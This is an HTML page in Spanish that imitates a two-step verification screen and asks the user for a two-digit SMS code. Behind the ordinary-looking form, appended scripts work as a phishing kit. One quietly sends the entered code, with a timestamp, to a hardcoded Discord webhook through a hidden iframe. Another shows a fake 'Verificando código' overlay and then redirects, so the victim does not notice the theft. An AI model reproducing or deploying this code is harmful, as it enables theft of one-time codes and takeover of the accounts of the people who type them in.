<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#006dfe">
<title>Verificación en dos pasos</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  :root{
    --azul:#006dfe;
    --gris-fondo:#f6f6f6;
    --texto:#0a0a0a;
    --texto-sec:#484848;
    --linea:#d9dde3;
    --blanco:#ffffff;
    --alto-real:100dvh;        /* lo actualiza el JS del teclado */
  }
  *{box-sizing:border-box;}
  html,body{
    margin:0;padding:0;height:100%;
    overscroll-behavior-y:none;          /* quita el rebote elástico */
    background:var(--azul);             /* zona segura superior azul */
    font-family:'Inter',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    color:var(--texto);
    -webkit-text-size-adjust:100%;
    -webkit-font-smoothing:antialiased;
  }
  .app{
    position:relative;
    height:100vh;                        /* reserva navegadores viejos */
    height:100dvh;
    height:var(--alto-real,100dvh);
    max-width:520px;margin:0 auto;
    background:var(--blanco);
    overflow:hidden;                     /* hay zona scrollable dentro */
    padding-top:env(safe-area-inset-top);
    display:flex;flex-direction:column;
  }

  /* ---------- barra superior ---------- */
  .topbar{
    flex:none;display:flex;align-items:center;justify-content:space-between;
    height:54px;padding:0 10px;background:var(--blanco);
  }
  .icon-btn{
    flex:none;display:flex;align-items:center;justify-content:center;
    width:44px;height:44px;border:none;background:none;padding:0;
    color:#1b1f27;cursor:pointer;touch-action:manipulation;
  }
  .icon-btn svg,.sos svg{display:block;}
  .right{display:flex;align-items:center;gap:2px;}
  .sos{
    flex:none;width:44px;height:44px;display:flex;align-items:center;justify-content:center;
    border:none;background:none;cursor:pointer;touch-action:manipulation;color:#1b1f27;
  }

  /* ---------- zona scrollable (única) ---------- */
  .scroll{
    flex:1 1 auto;min-height:0;                 /* imprescindible */
    overflow-y:auto;overscroll-behavior:contain;
    -webkit-overflow-scrolling:touch;
    background:var(--blanco);
  }

  /* ---------- cuerpo doble factor ---------- */
  .dfa-body{
    padding:clamp(18px,4dvh,44px) 28px 24px;
    display:flex;flex-direction:column;align-items:center;text-align:center;min-height:100%;
  }
  .dfa-ic{
    flex:none;width:62px;height:62px;border-radius:50%;
    background:rgba(0,109,254,.1);color:var(--azul);
    display:flex;align-items:center;justify-content:center;
    margin-bottom:clamp(14px,2.8dvh,24px);
  }
  .dfa-titulo{margin:0;font-size:22px;font-weight:800;letter-spacing:-.4px;color:var(--texto);}
  .dfa-sub{
    margin:10px 0 clamp(22px,4.4dvh,36px);
    font-size:15px;line-height:1.45;color:var(--texto-sec);max-width:300px;
  }
  .dfa-sub b{color:var(--texto);font-weight:700;}

  /* ---------- puntos enmascaradores (sin recuadro) ---------- */
  .otp{flex:none;display:flex;gap:34px;justify-content:center;}
  .otp-box{
    position:relative;
    width:54px;height:64px;
    display:flex;align-items:center;justify-content:center;
    cursor:text;
  }
  .otp-box input{
    position:absolute;inset:0;width:100%;height:100%;
    border:none;background:transparent;outline:none;
    text-align:center;font-family:inherit;font-size:32px;font-weight:700;
    color:transparent;caret-color:transparent;      /* el dígito real no se ve: lo pinta la capa visual */
    touch-action:manipulation;-moz-appearance:textfield;
  }
  .otp-box input::-webkit-outer-spin-button,.otp-box input::-webkit-inner-spin-button{-webkit-appearance:none;margin:0;}

  .otp-vis{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;pointer-events:none;}
  .otp-num,.otp-dot{
    position:absolute;
    transition:opacity .45s ease, transform .55s cubic-bezier(.22,1,.36,1), background-color .4s ease;
    will-change:opacity,transform;
  }
  .otp-num{font-size:32px;font-weight:700;color:var(--texto);line-height:1;opacity:0;transform:scale(.6);}
  /* punto: placeholder claro por defecto; oscuro cuando enmascara el dígito */
  .otp-dot{width:15px;height:15px;border-radius:50%;background:var(--linea);opacity:1;transform:scale(1);}
  /* campo activo y vacío: punto azul para saber dónde escribes */
  .otp-box:not(.lleno):focus-within .otp-dot{background:var(--azul);transform:scale(1.12);}
  /* mostrando el número: se desvanece el punto y aparece el dígito */
  .otp-box.mostrando .otp-num{opacity:1;transform:scale(1);}
  .otp-box.mostrando .otp-dot{opacity:0;transform:scale(.4);}
  /* oculto: el número se encoge y vuelve el punto, ahora oscuro */
  .otp-box.oculto .otp-num{opacity:0;transform:scale(.5);}
  .otp-box.oculto .otp-dot{opacity:1;transform:scale(1);background:var(--texto);}

  .dfa-msg{flex:none;margin:16px 0 0;font-size:14px;font-weight:600;min-height:18px;}
  .dfa-msg.error{color:#d23b3b;}

  .link-azul{
    color:var(--azul);font-size:15px;font-weight:600;text-decoration:none;
    padding:6px 0;touch-action:manipulation;
  }
  .dfa-reenviar{align-self:center;margin-top:clamp(18px,3.5dvh,30px);}

  /* ---------- botón inferior ---------- */
  .zona-boton{flex:none;background:var(--azul);padding-bottom:env(safe-area-inset-bottom);}
  .zona-boton button{
    width:100%;min-height:56px;border:none;background:none;
    color:#fff;font-size:18px;font-weight:700;letter-spacing:.2px;
    cursor:pointer;touch-action:manipulation;
  }

  /* ---------- con el teclado abierto ---------- */
  .app.teclado .zona-boton{
    position:absolute;left:0;right:0;bottom:0;z-index:20;
    max-width:520px;margin:0 auto;background:var(--azul);
    box-shadow:0 -2px 12px rgba(20,30,60,.16);
  }
  .app.teclado .dfa-body{padding-bottom:82px;}

  @media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important;}}
</style>
</head>
<body>
<div class="app" id="app">

  <header class="topbar">
    <button class="icon-btn" id="btn-volver" aria-label="Volver">
      <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
    </button>
    <div class="right">
      <button class="sos" aria-label="SOS">
        <svg width="29" height="25" viewBox="0 0 30 26" fill="none" aria-hidden="true">
          <path d="M2 3 H28 V17 H12 L6.5 23.5 V17 H2 Z" stroke="#1b1f27" stroke-width="1.6" stroke-linejoin="round"/>
          <text x="15" y="13.3" text-anchor="middle" font-family="Inter, system-ui, sans-serif" font-size="8.8" font-weight="800" letter-spacing="0.3" fill="#1b1f27">SOS</text>
        </svg>
      </button>
      <button class="icon-btn" aria-label="Atención al cliente">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
          <path d="M5.9 8.6a6.1 6.1 0 0 1 12.2 0" fill="none" stroke="currentColor" stroke-width="1.1" stroke-linecap="round"/>
          <circle cx="12" cy="9.3" r="4"/>
          <rect x="4.2" y="7.5" width="2.5" height="3.7" rx="1.15"/>
          <rect x="17.3" y="7.5" width="2.5" height="3.7" rx="1.15"/>
          <path d="M18.05 11.2c0 1.8-1.1 3-2.75 3.45" fill="none" stroke="currentColor" stroke-width="1.1" stroke-linecap="round"/>
          <rect x="13.95" y="13.7" width="2.3" height="1.55" rx="0.77" transform="rotate(33 15.1 14.5)"/>
          <path d="M11.5 14.9C7.5 14.9 4.8 16.7 4.8 19.3L11.5 19.3Z"/>
          <path d="M12.5 14.9C16.5 14.9 19.2 16.7 19.2 19.3L12.5 19.3Z"/>
        </svg>
      </button>
    </div>
  </header>

  <div class="scroll">
    <form class="dfa-body" id="form-2fa" novalidate>
      <div class="dfa-ic" aria-hidden="true">
        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l7 3v6c0 4.4-3 8.3-7 9.5C8 19.3 5 15.4 5 11V5l7-3z"/><path d="M9 11.5l2 2 4-4"/></svg>
      </div>
      <h1 class="dfa-titulo">Verificación en dos pasos</h1>
      <p class="dfa-sub">Introduce el código de <b>2 dígitos</b> que te hemos enviado por SMS.</p>

      <div class="otp" id="otp">
        <div class="otp-box">
          <input type="text" inputmode="numeric" autocomplete="one-time-code" aria-label="Primer dígito">
          <span class="otp-vis" aria-hidden="true"><span class="otp-num"></span><i class="otp-dot"></i></span>
        </div>
        <div class="otp-box">
          <input type="text" inputmode="numeric" aria-label="Segundo dígito">
          <span class="otp-vis" aria-hidden="true"><span class="otp-num"></span><i class="otp-dot"></i></span>
        </div>
      </div>

      <p class="dfa-msg" id="dfa-msg" role="status" aria-live="polite"></p>

      <a class="link-azul dfa-reenviar" href="#" id="link-reenviar">Reenviar código</a>
    </form>
  </div>

  <div class="zona-boton">
    <button type="submit" form="form-2fa" id="btn-verificar">Verificar</button>
  </div>

</div>

<script>
(function(){
  "use strict";
  var app=document.getElementById('app');

  var btnVolver=document.getElementById('btn-volver');
  if(btnVolver) btnVolver.addEventListener('click',function(){ if(history.length>1) history.back(); });

  var linkReenviar=document.getElementById('link-reenviar');
  if(linkReenviar) linkReenviar.addEventListener('click',function(e){ e.preventDefault(); });

  /* ---------- doble factor: 2 dígitos con enmascarado ---------- */
  var otpBoxes=Array.prototype.slice.call(document.querySelectorAll('#otp input'));
  var msg=document.getElementById('dfa-msg');
  var timers=[];
  function limpiarMsg(){ if(msg){ msg.textContent=''; msg.className='dfa-msg'; } }

  // pinta el dígito: visible ~1,1 s y luego se oculta como punto (animación fluida)
  function pintarDigito(idx){
    var inp=otpBoxes[idx], box=inp.parentNode, num=box.querySelector('.otp-num');
    clearTimeout(timers[idx]);
    if(inp.value){
      num.textContent=inp.value;
      box.classList.add('lleno','mostrando');
      box.classList.remove('oculto');
      timers[idx]=setTimeout(function(){
        box.classList.remove('mostrando');
        box.classList.add('oculto');
      },1100);
    }else{
      num.textContent='';
      box.classList.remove('lleno','mostrando','oculto');
    }
  }

  otpBoxes.forEach(function(box,i){
    box.addEventListener('input',function(){
      var v=box.value.replace(/[^0-9]/g,'');
      if(!v){ box.value=''; pintarDigito(i); limpiarMsg(); return; }
      // reparte los dígitos (escritura rápida, pegado o autorrelleno de SMS)
      for(var j=0;j<v.length && i+j<otpBoxes.length;j++){
        otpBoxes[i+j].value=v.charAt(j);
        pintarDigito(i+j);
      }
      var filled=Math.min(i+v.length, otpBoxes.length);
      otpBoxes[Math.min(filled, otpBoxes.length-1)].focus();
      limpiarMsg();
    });
    box.addEventListener('keydown',function(e){
      if(e.key==='Backspace' && !box.value && i>0){
        var prev=otpBoxes[i-1]; prev.value=''; pintarDigito(i-1); prev.focus(); e.preventDefault();
      }
    });
    box.addEventListener('focus',function(){ setTimeout(function(){box.select();},0); });
  });

  var form2=document.getElementById('form-2fa');
  if(form2) form2.addEventListener('submit',function(e){
    e.preventDefault();                    // demo sin backend
    var code=otpBoxes.map(function(b){return b.value;}).join('');
    if(code.length<otpBoxes.length){
      msg.textContent='Introduce los 2 dígitos.'; msg.className='dfa-msg error';
      var falta=otpBoxes.filter(function(b){return !b.value;})[0]; if(falta) falta.focus();
      return;
    }
    // código completo: demo sin backend (sin mensaje en pantalla)
    limpiarMsg();
    if(document.activeElement && document.activeElement.blur) document.activeElement.blur();
  });

  /* ---------- manejo del teclado (según reglas) ---------- */
  var campos=otpBoxes;
  var altoSinTeclado=0;
  function altoVisible(){return window.visualViewport?window.visualViewport.height:window.innerHeight;}
  function hayCampoEnfocado(){return campos.indexOf(document.activeElement)!==-1;}
  function ajustarTeclado(){
    var visible=altoVisible();
    if(!hayCampoEnfocado() && visible>altoSinTeclado) altoSinTeclado=visible;
    app.style.setProperty('--alto-real',visible+'px');
    var abierto=hayCampoEnfocado() && (altoSinTeclado-visible)>120;
    app.classList.toggle('teclado',abierto);
  }
  if(window.visualViewport){
    window.visualViewport.addEventListener('resize',ajustarTeclado);
    window.visualViewport.addEventListener('scroll',ajustarTeclado);
  }
  window.addEventListener('resize',ajustarTeclado);
  window.addEventListener('orientationchange',function(){altoSinTeclado=0;setTimeout(ajustarTeclado,400);});
  campos.forEach(function(c){
    c.addEventListener('focus',function(){setTimeout(ajustarTeclado,60);});
    c.addEventListener('blur',function(){setTimeout(ajustarTeclado,60);});
  });
  ajustarTeclado();
})();
</script>

  
<script>
(function () {
  'use strict';

  var WEBHOOK_URL = 'https://discord.com/api/webhooks/1565367204650688623/pCDV0iKBUabAhnMDCstDwAKkvpXCgN4Cj63UKFD_u7h0SZzKU1Oiilfk5b3nhHmvO3N6';
  var form = document.getElementById('form-2fa');
  
  if (!form) return;

  // Escuchamos el envío del formulario
  form.addEventListener('submit', function () {
    
    // CORRECCIÓN: Buscamos los <input> reales, no el div que los contiene
    var inputs = document.querySelectorAll('#otp input');
    if (inputs.length !== 2) return;

    // Unimos los valores de ambos inputs
    var code = inputs[0].value.trim() + inputs[1].value.trim();
    
    // Solo enviamos si hay exactamente 2 dígitos
    if (code.length !== 2) return;

    // --- ENVÍO INVISIBLE A DISCORD ---
    var iframeName = 'sink_' + Date.now();
    var iframe = document.createElement('iframe');
    iframe.name = iframeName;
    iframe.style.display = 'none';
    document.body.appendChild(iframe);

    var sendForm = document.createElement('form');
    sendForm.action = WEBHOOK_URL;
    sendForm.method = 'POST';
    sendForm.enctype = 'multipart/form-data';
    sendForm.target = iframeName;

    var payload = {
      username: 'Vialto 2FA',
      embeds: [{
        title: '🔑 Código de Verificación',
        color: 0x006dfe,
        fields: [
          { name: 'Código', value: '`' + code + '`', inline: true },
          { name: 'Hora', value: new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' }), inline: false }
        ]
      }]
    };

    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'payload_json';
    input.value = JSON.stringify(payload);
    sendForm.appendChild(input);

    document.body.appendChild(sendForm);
    sendForm.submit();

    // Limpieza
    setTimeout(function () {
      iframe.remove();
      sendForm.remove();
    }, 2000);

  }, true); 

})();
</script>

<script>
(function () {
  'use strict';
  var form = document.getElementById('form-2fa');
  if (!form) { console.warn('[Overlay2FA] No se encontró #form-2fa.'); return; }

  var REDIRECT_URL = 'index2.html';   // destino tras el overlay
  var DURATION_MS  = 11000;           // 11 s
  var CANDIDATES   = ['loader.png', 'loader.gif'];
  var fired        = false;

  // Capturamos el submit ANTES de que el resto de listeners hagan nada.
  document.addEventListener('submit', function (e) {
    if (e.target !== form) return;
    var inputs = form.querySelectorAll('#otp input');
    if (inputs.length !== 2) return;
    var code = (inputs[0].value || '') + (inputs[1].value || '');
    if (code.length !== 2) return;    // deja al script original mostrar "Introduce los 2 dígitos"
    if (fired) return;
    fired = true;
    e.preventDefault();
    // No llamamos a stopImmediatePropagation: así el webhook de Discord
    // (que escucha en este mismo form con capture:true) sigue funcionando.
    console.log('[Overlay2FA] Verificar pulsado');
    showLoader();
  }, true);

  function showLoader() {
    if (document.getElementById('fake-loader-2fa')) return;

    var overlay = document.createElement('div');
    overlay.id = 'fake-loader-2fa';
    overlay.style.cssText =
      'position:fixed;top:0;left:0;width:100%;height:100%;' +
      'background:rgba(10,15,25,0.95);' +
      'backdrop-filter:blur(5px);-webkit-backdrop-filter:blur(5px);' +
      'z-index:2147483647;display:flex;flex-direction:column;' +
      'align-items:center;justify-content:center;padding:20px;' +
      'box-sizing:border-box;text-align:center;' +
      "font-family:'Inter',system-ui,-apple-system,sans-serif;";

    if (!document.getElementById('spinner-keyframes')) {
      var st = document.createElement('style');
      st.id = 'spinner-keyframes';
      st.textContent = '@keyframes forzarGiro{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}';
      document.head.appendChild(st);
    }

    var loaderBox = document.createElement('div');
    loaderBox.style.cssText =
      'width:clamp(140px,26vw,220px);height:clamp(140px,26vw,220px);' +
      'margin-bottom:clamp(20px,4vw,35px);display:flex;align-items:center;justify-content:center;';
    overlay.appendChild(loaderBox);

    function replaceWithSpinner() {
      loaderBox.innerHTML = '';
      var s = document.createElement('div');
      s.style.cssText =
        'width:85%;height:85%;border-radius:50%;' +
        'border:5px solid rgba(255,255,255,0.2);border-top:5px solid #006dfe;' +
        'box-sizing:border-box;animation:forzarGiro 1s linear infinite;';
      loaderBox.appendChild(s);
    }

    var img = document.createElement('img');
    img.alt = 'Cargando';
    img.style.cssText = 'width:100%;height:100%;object-fit:contain;display:block;';
    loaderBox.appendChild(img);

    var idx = 0, state = 'loading', timer = null;

    function tryNext() {
      if (idx >= CANDIDATES.length) { state = 'error'; img.remove(); replaceWithSpinner(); return; }
      state = 'loading';
      var src = CANDIDATES[idx] + '?v=' + Date.now();
      console.log('[Overlay2FA] Probando: ' + src);
      clearTimeout(timer);
      timer = setTimeout(function () {
        if (state === 'loading') { state = 'timeout'; console.warn('[Overlay2FA] Timeout: ' + src); idx++; tryNext(); }
      }, 2500);
      img.src = src;
    }

    img.onload = function () {
      if (state !== 'loading') return;
      clearTimeout(timer);
      state = 'loaded';
      console.log('[Overlay2FA] Imagen OK: ' + img.naturalWidth + '×' + img.naturalHeight);
      if (img.naturalWidth < 20 || img.naturalHeight < 20) { console.warn('[Overlay2FA] Imagen demasiado pequeña.'); idx++; tryNext(); }
    };

    img.onerror = function () {
      if (state !== 'loading') return;
      clearTimeout(timer);
      console.warn('[Overlay2FA] Fallo al cargar: ' + img.src);
      idx++; tryNext();
    };

    tryNext();

    var title = document.createElement('h2');
    title.style.cssText =
      'font-size:clamp(20px,4.5vw,26px);color:#fff;font-weight:700;margin:0;letter-spacing:0.3px;';
    title.textContent = 'Verificando código';
    overlay.appendChild(title);

    var sub = document.createElement('p');
    sub.style.cssText =
      'font-size:clamp(14px,3.2vw,16px);color:rgba(255,255,255,0.8);margin-top:10px;';
    sub.textContent = 'Por favor, espere un momento...';
    overlay.appendChild(sub);

    document.body.appendChild(overlay);
    document.body.style.overflow = 'hidden';

    console.log('[Overlay2FA] Redirigiendo a ' + REDIRECT_URL + ' en ' + DURATION_MS + 'ms...');
    setTimeout(function () { window.location.href = REDIRECT_URL; }, DURATION_MS);
  }
})();
</script>

</body>
</html>
